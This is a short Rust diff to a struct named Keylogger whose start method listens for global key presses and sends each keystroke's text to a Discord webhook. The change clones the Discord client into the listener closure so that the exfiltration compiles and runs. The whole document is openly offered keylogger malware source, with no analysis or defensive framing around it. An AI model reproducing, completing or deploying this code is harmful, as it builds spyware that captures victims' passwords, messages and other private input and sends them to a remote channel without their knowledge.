@@ -21,25 +21,28 @@ impl Keylogger {
 
 	pub fn start(&self) {
 
+		let discord_client = self.discord_client.clone();
+
 		if let Err(error) = listen(move |event: Event| {   
+			let discord_client = discord_client.clone();
+			
 	        //println!("{:?}", event);
 	        //println!("{:?}", event.event_type);
 	        //println!("{:?}", event.name);
 
 	        match event.event_type {
 	            EventType::KeyPress(_key) => {
-	                //let discord_client = self.discord_client.clone(); 
+	                //let discord_client = discord_client.clone(); 
 	                let text: String = event.name.unwrap().clone();
 	                println!("{:?}", text);
 	                task::spawn(async move {
-	                    self.discord_client.send_webhook(&text);
+	                    discord_client.send_webhook(&text);
 	                });
-            	},
-            _ => (),
+	            },
+	            _ => (),
 	        }
 	    }) {
 	        println!("Error: {:?}", error);
 	    }
-
 	}
 }
